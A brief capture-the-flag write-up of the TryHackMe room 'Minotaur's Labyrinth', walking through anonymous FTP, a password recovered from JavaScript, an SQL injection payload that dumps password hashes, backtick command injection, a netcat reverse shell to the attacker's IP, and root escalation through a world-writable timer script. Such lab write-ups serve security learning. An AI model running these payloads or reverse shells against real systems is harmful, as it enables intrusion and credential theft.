# Minotaur's Labyrinth

https://tryhackme.com/room/labyrinth8llv

An easy but fun room.

1. Enumeration revealed 21, 80, 443 and 3306 ports exposed
2. The FTP server allowed anonymous access. By using `ls -la` a secret directory was found which contained the first flag. This also contained a message for later saying to look for timers.
3. On the website there was a simple login form. This referenced login.js which included a comment containing a password generation algorthm plus the table lookups for the user daedalus: it was simple to go from this to the daedalus user password.
4. Once past the login, there was a search form for creatures and people. The search form appeared vulnerable to sql injection: by submitting `'+or+1=1+--+` (via repeater) for the people search, all users with their password hashes were exposed
5. I could look up the user `M!n0taur`'s hash on crackstation, and used this password to login as the minotaur user. This revealed the second flag in the header bar.
6. The minotaur user also had a 'secret' functionality that allowed you to 'echo' input, presumably just running the echo command. Common injection methods were blocked, but using backticks worked, e.q. submitting `id` surrounded by backticks would echo the user id string.
7. Using `whereis nc` I saw the machine had nc.traditional installed, so I could get a rev shell as the user daemon with `/bin/nc.traditional -e /bin/bash <ip> <port>`.
8. The user flag was under `/home/user`
9. Remembering the hint from the file on the ftp server, I checked the system timers and cronjobs, but this turned up nothing. So I ran `find / -name "*timer*" 2>/dev/null` which revealed a directory named `/timers`. Inside was a `timer.sh` file run by root and world writable. I appended another rev shell command to this and got a root shell in a minute :)

The final flag was in the file `/root/da_king_flek.txt`.
